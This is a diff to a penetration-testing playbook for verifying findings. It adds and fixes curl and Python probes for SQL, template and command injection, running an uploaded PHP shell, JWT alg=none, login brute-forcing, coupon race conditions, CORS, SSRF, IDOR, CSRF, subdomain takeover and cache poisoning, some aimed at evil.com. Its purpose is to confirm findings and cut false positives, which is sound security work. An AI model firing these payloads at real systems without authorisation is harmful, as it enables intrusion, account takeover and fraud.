@@ -19,8 +19,8 @@ Every finding must pass this checklist before inclusion in the report.
 ```bash
 # Claim: /.git/ returns HTTP 403 → directory exists
 # Test: Also request a completely random dot-path
-curl -sk -o /dev/null -w "%{http_code} %{size_download}" "http://TARGET/.git/HEAD"
-curl -sk -o /dev/null -w "%{http_code} %{size_download}" "http://TARGET/.nonexistent123/x"
+curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" "http://TARGET/.git/HEAD"
+curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" "http://TARGET/.nonexistent123/x"
 
 # If both return 403 + same size → Apache generic dot-path block = FALSE POSITIVE
 # If /.git/ returns 403 + 26B and /.random/ returns 404 = TRUE POSITIVE
@@ -39,13 +39,14 @@ curl -sk -X POST "http://TARGET/reset" -d "username=doesnotexist999" | grep -i '
 ### SQL Injection
 ```bash
 # Boolean test (should change response if injectable)
+# NOTE: URL-encode spaces as + — curl rejects URLs with raw spaces (exit 3)
 curl -sk "http://TARGET/page?id=1" -o a.txt
-curl -sk "http://TARGET/page?id=1 AND 1=1" -o b.txt  # should == a
-curl -sk "http://TARGET/page?id=1 AND 1=2" -o c.txt  # should differ from a
+curl -sk "http://TARGET/page?id=1+AND+1=1" -o b.txt  # should == a
+curl -sk "http://TARGET/page?id=1+AND+1=2" -o c.txt  # should differ from a
 
 # Time-based (only if no other indicator)
 START=$(date +%s%N)
-curl -sk "http://TARGET/page?id=1 AND SLEEP(5)--"
+curl -sk "http://TARGET/page?id=1+AND+SLEEP(5)--"
 END=$(date +%s%N)
 echo "Elapsed: $(( (END-START)/1000000 ))ms"
 # > 5000ms = likely vulnerable; bcrypt/constant-time may mask timing
@@ -90,7 +91,7 @@ curl -sk "http://TARGET/core/config/config.inc.php" \
 ### No Account Lockout
 ```bash
 python3 - <<'EOF'
-import urllib.request, urllib.parse, time
+import urllib.request, urllib.error, urllib.parse, time
 
 url = "http://TARGET/connectors/index.php"
 headers = {"Host": "HOSTNAME", "Content-Type": "application/x-www-form-urlencoded"}
@@ -102,8 +103,15 @@ for i in range(1, 51):
         "password": f"wrongpass{i}"
     }).encode()
     req = urllib.request.Request(url, data=data, headers=headers)
-    r = urllib.request.urlopen(req)
-    body = r.read().decode()
+    try:
+        r = urllib.request.urlopen(req)
+        body = r.read().decode(errors="replace")
+    except urllib.error.HTTPError as e:
+        # 401/403 still carry a body — read it, and treat 403/429 as lockout signals
+        body = e.read().decode(errors="replace")
+        if e.code in (403, 429):
+            print(f"Attempt {i}: HTTP {e.code} — LOCKOUT SIGNAL")
+            break
     if i % 10 == 0:
         locked = "lockout" in body.lower() or "blocked" in body.lower()
         print(f"Attempt {i}: locked={locked} | {body[:60]}")
@@ -177,7 +185,7 @@ Reason: [one sentence explaining the determination]
 ```bash
 # Confirm math expression evaluates server-side
 curl -sk "http://IP/page?param={{7*7}}" | grep '49'      # Jinja2/Twig
-curl -sk "http://IP/page?param=${7*7}" | grep '49'       # Spring/Freemarker
+curl -sk 'http://IP/page?param=${7*7}' | grep '49'       # Spring/Freemarker (single quotes — ${} breaks bash double quotes)
 curl -sk "http://IP/page?param=#{7*7}" | grep '49'       # Ruby ERB / Pebble
 
 # Confirm it's not client-side (would only evaluate in browser JS, not curl)
@@ -213,15 +221,15 @@ curl -sk "http://IP/page?param=;id" | grep 'uid='
 ```bash
 # After upload, find the stored URL from the response
 STORED_URL=$(curl -sk -X POST "http://IP/upload" -F "file=@/tmp/test.php" \
-  -H "Host: HOSTNAME" | grep -oP 'https?://[^"<\s]+\.php')
+  -H "Host: HOSTNAME" | grep -oE 'https?://[^"<[:space:]]+\.php')
 
 # Attempt execution
 curl -sk "$STORED_URL?c=id" | grep uid
 # uid returned = CRITICAL — PHP execution confirmed
 
 # If no direct URL in response, try predictable paths
-for PATH in "/uploads/" "/files/" "/media/" "/assets/uploads/" "/public/files/"; do
-  curl -sk -o /dev/null -w "%{http_code}" "http://IP${PATH}test.php" -H "Host: HOSTNAME"
+for P in "/uploads/" "/files/" "/media/" "/assets/uploads/" "/public/files/"; do
+  curl -sk -o /dev/null -w "%{http_code}\n" "http://IP${P}test.php" -H "Host: HOSTNAME"
 done
 ```
 
@@ -254,8 +262,14 @@ curl -sk -X POST "http://IP/api/xml" -H "Host: HOSTNAME" \
 
 ```bash
 # Decode without verification — check claim values
+# (JWT uses base64URL — translate alphabet and re-pad before decoding)
 JWT="TOKEN_FROM_APP"
-echo $JWT | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
+echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | python3 -c "
+import sys, base64, json
+d = sys.stdin.read().strip()
+d += '=' * (-len(d) % 4)
+print(json.dumps(json.loads(base64.b64decode(d)), indent=2))
+"
 
 # Test alg=none: craft token, send to protected endpoint
 curl -sk "http://IP/api/admin" -H "Host: HOSTNAME" \
@@ -279,14 +293,14 @@ curl -sk "http://IP/api/admin" -H "Authorization: Bearer NEW_TOKEN" -H "Host: HO
 ```bash
 # Confirm by checking state after parallel requests
 # 1. Record balance/count BEFORE
-BEFORE=$(curl -sk "http://IP/api/balance" -b "session=VALID" -H "Host: HOSTNAME" | grep -oP '\d+')
+BEFORE=$(curl -sk "http://IP/api/balance" -b "session=VALID" -H "Host: HOSTNAME" | grep -oE '[0-9]+')
 
 # 2. Send 20 parallel redemptions
 seq 1 20 | xargs -P 20 -I{} curl -sk -X POST "http://IP/redeem" \
   -b "session=VALID" -d "coupon=SAVE50" -H "Host: HOSTNAME" -o /dev/null
 
 # 3. Record balance AFTER
-AFTER=$(curl -sk "http://IP/api/balance" -b "session=VALID" -H "Host: HOSTNAME" | grep -oP '\d+')
+AFTER=$(curl -sk "http://IP/api/balance" -b "session=VALID" -H "Host: HOSTNAME" | grep -oE '[0-9]+')
 
 echo "Before: $BEFORE | After: $AFTER"
 # If AFTER shows discount applied multiple times = TRUE POSITIVE
@@ -333,9 +347,13 @@ curl -sk -X POST "http://IP/api" --data-binary @<(base64 -d /tmp/dns_payload.b64
 ## CORS Verification (Requires Credentials)
 
 ```bash
-# True CORS misconfiguration = BOTH conditions must hold:
-# 1. ACAO reflects your origin (or is *)
-# 2. ACAC = true (required for credential-bearing requests to be exploitable)
+# True CORS misconfiguration = one of these shapes:
+# A. ACAO reflects YOUR specific origin (https://evil.com) AND ACAC = true
+#    → credential-bearing cross-origin reads work = TRUE POSITIVE
+# B. ACAO = * on an endpoint returning sensitive data, NO credentials needed
+#    (ACAC absent/false) → unauthenticated cross-origin read = TRUE POSITIVE
+# NOTE: ACAO = * WITH ACAC = true is browser-blocked (browsers reject that
+# combo) — alone it is NOT exploitable; downgrade or mark CONDITIONAL.
 
 curl -sk "http://IP/api/data" -H "Host: HOSTNAME" \
   -H "Origin: https://evil.com" \
@@ -346,11 +364,11 @@ curl -sk "http://IP/api/data" -H "Host: HOSTNAME" \
 # Check response body contains sensitive data
 cat response.json | python3 -m json.tool | grep -i 'email\|token\|user\|id'
 
-# All of these together = TRUE POSITIVE:
-# - ACAO = https://evil.com (or *)
-# - ACAC = true
+# TRUE POSITIVE requires:
+# - ACAO = https://evil.com (your exact reflected origin — NOT *) with ACAC = true, OR
+#   ACAO = * with sensitive data readable WITHOUT credentials
 # - Response body contains sensitive data
-# - Session cookie included = attacker can exfiltrate data cross-origin
+# - (Case A) session cookie included = attacker can exfiltrate data cross-origin
 ```
 
 ---
@@ -381,8 +399,9 @@ curl -sk -X POST "http://IP/api/login" -H "Host: HOSTNAME" \
 curl -sI "http://IP/" -H "Host: HOSTNAME" | grep -i 'x-frame-options\|frame-ancestors'
 # If absent: test in browser with this PoC
 
-# HTML PoC
-cat << 'EOF'
+# HTML PoC — save to file, then serve it
+mkdir -p pentest/poc
+cat > pentest/poc/clickjacking.html << 'EOF'
 <!DOCTYPE html>
 <html>
 <body>
@@ -397,7 +416,7 @@ cat << 'EOF'
 </html>
 EOF
 # If iframe loads target page = TRUE POSITIVE
-# Save PoC as pentest/poc/clickjacking.html and serve: python3 -m http.server 8888
+# Serve the PoC: python3 -m http.server 8888 (from pentest/poc/)
 ```
 
 ---
@@ -416,4 +435,97 @@ curl -sk -X POST "http://IP/graphql" -H "Host: HOSTNAME" \
   -H "Content-Type: application/json" \
   --data '{"query":"{ __schema { types { name } } }"}' | grep '"name"' | wc -l
 # > 5 type names = introspection enabled = TRUE POSITIVE
+```
+
+---
+
+## SSRF Verification
+
+```bash
+# OOB callback is the only reliable proof — get a token from an interactsh
+# client or Burp Collaborator first, then:
+curl -sk "http://IP/page?url=https://TOKEN.oast.live/ssrf" -H "Host: HOSTNAME" -o /dev/null
+
+# Baseline (known-negative): an unroutable/reserved target should NOT fire a callback
+curl -sk "http://IP/page?url=https://TOKEN.oast.live/" -H "Host: HOSTNAME" -o /dev/null
+
+# DNS/HTTP interaction for the full path (not just DNS on the base domain)
+# = TRUE POSITIVE. No interaction on either = FALSE POSITIVE.
+```
+
+---
+
+## IDOR Verification
+
+```bash
+# Two-account replay diff — capture the same object with user A and user B sessions
+curl -sk "http://IP/api/orders/1001" -H "Host: HOSTNAME" -H "Cookie: session=USER_A" -o idor_A.txt
+curl -sk "http://IP/api/orders/1001" -H "Host: HOSTNAME" -H "Cookie: session=USER_B" -o idor_B.txt
+diff idor_A.txt idor_B.txt
+
+# Baseline: B requesting a nonexistent object must NOT return A's data
+curl -sk "http://IP/api/orders/999999" -H "Host: HOSTNAME" -H "Cookie: session=USER_B" -o /dev/null -w "%{http_code}\n"
+
+# B receives A's object (200, same body as A) = TRUE POSITIVE
+# 403/404 for B = access control enforced = FALSE POSITIVE
+```
+
+---
+
+## CSRF Verification
+
+```bash
+# 1. Capture a valid state-changing request (with token) — confirm it succeeds
+curl -sk -X POST "http://IP/account/email" -H "Host: HOSTNAME" \
+  -b "session=VALID" -d "email=a@a.com&csrf=VALID_TOKEN" -o csrf_ok.txt
+
+# 2. Replay WITHOUT the token (and without Origin/Referer)
+curl -sk -X POST "http://IP/account/email" -H "Host: HOSTNAME" \
+  -b "session=VALID" -d "email=b@b.com" -o csrf_notoken.txt
+
+# 3. Verify state actually changed (read back the profile)
+curl -sk "http://IP/account" -H "Host: HOSTNAME" -b "session=VALID" | grep -o 'b@b.com'
+
+# State changed without token = TRUE POSITIVE
+# 403/error or state unchanged = protected = FALSE POSITIVE
+```
+
+---
+
+## Subdomain Takeover Verification
+
+```bash
+# 1. Identify the CNAME target
+dig +short CNAME sub.target.com
+
+# 2. Request the vhost ON THE SERVICE and match its "unclaimed" fingerprint body
+curl -sk "https://SERVICE-CNAME/" -H "Host: sub.target.com" \
+  | grep -i 'there isn.t a github pages site\|no such app\|project not found\|domain not configured'
+# GitHub Pages: "There isn't a GitHub Pages site here."
+# Heroku: "No such app" | Netlify: "Not Found" | etc.
+
+# 3. Claim test (authorization permitting): create the resource name in your own
+#    account on the service; if the name is available = TRUE POSITIVE
+
+# Dead CNAME (NXDOMAIN) alone = only POTENTIAL — confirm the service fingerprint
+# and claimability before reporting. Use subjack/dnsreaper for the broad sweep.
+```
+
+---
+
+## Cache Poisoning Verification
+
+```bash
+# Compare a cache-busted (unkeyed, always-miss) request against the poisoned one
+curl -sk "http://IP/page?cb=$(date +%s)" -H "Host: HOSTNAME" \
+  -H "X-Forwarded-Host: evil.com" -o cache_baseline.txt
+curl -sk "http://IP/page" -H "Host: HOSTNAME" \
+  -H "X-Forwarded-Host: evil.com" -o cache_poisoned.txt
+diff cache_baseline.txt cache_poisoned.txt
+
+# Then fetch WITHOUT the evil header — if the cached (poisoned) body is served
+# to the clean request = TRUE POSITIVE
+curl -sk "http://IP/page" -H "Host: HOSTNAME" | grep 'evil.com'
+# evil.com present in clean response = poisoned cache served to others = TRUE POSITIVE
+# Reflection only in your own response = input reflection, NOT cache poisoning
 ```
